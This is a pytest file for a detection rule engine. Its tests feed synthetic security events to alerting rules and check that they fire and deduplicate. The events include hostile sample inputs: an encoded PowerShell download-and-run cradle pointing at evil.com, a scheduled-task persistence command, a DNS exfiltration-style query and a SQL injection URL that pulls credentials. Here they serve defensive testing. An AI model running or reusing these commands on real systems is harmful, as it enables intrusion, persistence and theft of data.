"""Detection rule engine tests — every Phase-1 rule exercised with synthetic events."""
from __future__ import annotations

from tests.conftest import ingest


def _get_alerts(client, headers, rule_id):
    r = client.get("/api/v1/alerts?limit=200", headers=headers)
    assert r.status_code == 200
    return [a for a in r.json()["alerts"] if a["rule_id"] == rule_id]


def test_bruteforce_threshold_fires_once(client, admin_headers):
    events = [{"type": "auth", "payload": {"src_ip": "9.9.9.1", "user": f"u{i % 2}",
                                           "outcome": "failure", "host": "dc-01"}}
              for i in range(10)]
    r = ingest(client, admin_headers, events)
    alerts = _get_alerts(client, admin_headers, "AUTH-BRUTEFORCE-001")
    assert len(alerts) == 1, f"expected 1 bruteforce alert, got {len(alerts)}"
    a = alerts[0]
    assert a["severity_id"] == 4
    assert "T1110" in a["attack_ids"]
    assert a["entity_key"] == "9.9.9.1"
    assert len(a["evidence_event_ids"]) == 10
    # cooldown: 5 more failures inside the window must NOT re-fire
    ingest(client, admin_headers,
           [{"type": "auth", "payload": {"src_ip": "9.9.9.1", "user": "u0",
                                         "outcome": "failure", "host": "dc-01"}}] * 5)
    assert len(_get_alerts(client, admin_headers, "AUTH-BRUTEFORCE-001")) == 1


def test_password_spray_distinct_users(client, admin_headers):
    events = [{"type": "auth", "payload": {"src_ip": "9.9.9.2", "user": f"spray-user-{i}",
                                           "outcome": "failure", "host": "dc-01"}}
              for i in range(5)]
    ingest(client, admin_headers, events)
    alerts = _get_alerts(client, admin_headers, "AUTH-PASSWORDSPRAY-002")
    assert len(alerts) == 1
    assert "T1110.003" in alerts[0]["attack_ids"]


def test_password_spray_requires_distinct_users(client, admin_headers):
    # 10 failures but only 2 distinct users from this source -> count rule may fire
    # (different source ip to isolate), but the spray rule must not.
    events = [{"type": "auth", "payload": {"src_ip": "9.9.9.22", "user": "only-two-a" if i % 2 else "only-two-b",
                                           "outcome": "failure", "host": "dc-01"}}
              for i in range(5)]
    ingest(client, admin_headers, events)
    alerts = _get_alerts(client, admin_headers, "AUTH-PASSWORDSPRAY-002")
    assert all(a["entity_key"] != "9.9.9.22" for a in alerts)


def test_portscan_distinct_ports(client, admin_headers):
    events = [{"type": "network", "payload": {"src_ip": "9.9.9.3", "dst_ip": "10.10.0.10",
                                              "dst_port": 1000 + i, "protocol": "tcp"}}
              for i in range(20)]
    ingest(client, admin_headers, events)
    alerts = _get_alerts(client, admin_headers, "NET-PORTSCAN-001")
    assert len(alerts) == 1
    assert "T1046" in alerts[0]["attack_ids"]
    assert alerts[0]["severity_id"] == 3


def test_powershell_pattern_and_dedup(client, admin_headers):
    cmd = "powershell.exe -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwAuAHAAcwAxACcAKQA="
    r = ingest(client, admin_headers,
               [{"type": "process", "payload": {"host": "ws-evil-01", "process_name": "powershell.exe",
                                                "command_line": cmd}}])
    assert r.status_code == 200
    alerts = _get_alerts(client, admin_headers, "HOST-PS-ATTACK-001")
    assert len(alerts) == 1
    assert "T1059.001" in alerts[0]["attack_ids"]
    # same command again within dedup window -> no new alert
    ingest(client, admin_headers,
           [{"type": "process", "payload": {"host": "ws-evil-01", "process_name": "powershell.exe",
                                            "command_line": cmd}}])
    assert len(_get_alerts(client, admin_headers, "HOST-PS-ATTACK-001")) == 1
    # benign powershell -> never fires
    ingest(client, admin_headers,
           [{"type": "process", "payload": {"host": "ws-evil-01", "process_name": "powershell.exe",
                                            "command_line": "powershell.exe -Command Get-Date"}}])
    assert len(_get_alerts(client, admin_headers, "HOST-PS-ATTACK-001")) == 1


def test_schtasks_persistence(client, admin_headers):
    ingest(client, admin_headers,
           [{"type": "process", "payload": {"host": "ws-evil-02", "process_name": "schtasks.exe",
                                            "command_line": "schtasks.exe /create /tn Updater /sc onstart /tr C:\\Temp\\svchost.exe"}}])
    alerts = _get_alerts(client, admin_headers, "HOST-PERSIST-001")
    assert len(alerts) == 1
    assert "T1053.005" in alerts[0]["attack_ids"]


def test_dns_tunnel_indicator(client, admin_headers):
    long_label = "cnvwdq3nfk2hsjkk3nfm2jd9mm3kccnwdq3nfk2hsjk"  # 40 base32-ish chars
    ingest(client, admin_headers,
           [{"type": "dns", "payload": {"host": "ws-evil-03", "src_ip": "10.20.3.31",
                                        "dns_query": f"{long_label}.exfil-bad-domain.net"}}])
    alerts = _get_alerts(client, admin_headers, "NET-DNSTUNNEL-001")
    assert len(alerts) == 1
    assert "T1071.004" in alerts[0]["attack_ids"]
    # normal dns never fires
    ingest(client, admin_headers,
           [{"type": "dns", "payload": {"host": "ws-evil-03", "dns_query": "www.github.com"}}])
    assert len(_get_alerts(client, admin_headers, "NET-DNSTUNNEL-001")) == 1


def test_ransomware_file_velocity(client, admin_headers):
    events = [{"type": "file", "payload": {"host": "victim-host-01", "file_action": "modify",
                                           "file_path": f"C:\\Users\\victim\\Docs\\f{i}.docx.locked"}}
              for i in range(50)]
    ingest(client, admin_headers, events)
    alerts = _get_alerts(client, admin_headers, "FILE-RANSOM-001")
    assert len(alerts) == 1
    assert "T1486" in alerts[0]["attack_ids"]
    assert alerts[0]["severity_id"] == 5


def test_sqli_pattern(client, admin_headers):
    ingest(client, admin_headers,
           [{"type": "http", "payload": {"src_ip": "9.9.9.4", "http_method": "GET",
                                         "http_url": "/products?id=1 UNION SELECT username, password FROM users--",
                                         "http_status": 500}}])
    alerts = _get_alerts(client, admin_headers, "WEB-SQLI-001")
    assert len(alerts) == 1
    assert "T1190" in alerts[0]["attack_ids"]


def test_user_enumeration_indicator(client, admin_headers):
    ingest(client, admin_headers,
           [{"type": "auth", "payload": {"src_ip": "9.9.9.5", "user": "doesnotexist1",
                                         "outcome": "failure", "host": "dc-01",
                                         "message": "no such user: doesnotexist1"}}])
    alerts = _get_alerts(client, admin_headers, "AUTH-SUSPICIOUS-LOGON-003")
    assert len(alerts) == 1


def test_rules_api_lists_loaded_rules(client, admin_headers):
    r = client.get("/api/v1/rules", headers=admin_headers)
    assert r.status_code == 200
    rules = r.json()["rules"]
    assert r.json()["total"] >= 9
    ids = {x["id"] for x in rules}
    assert "AUTH-BRUTEFORCE-001" in ids and "WEB-SQLI-001" in ids
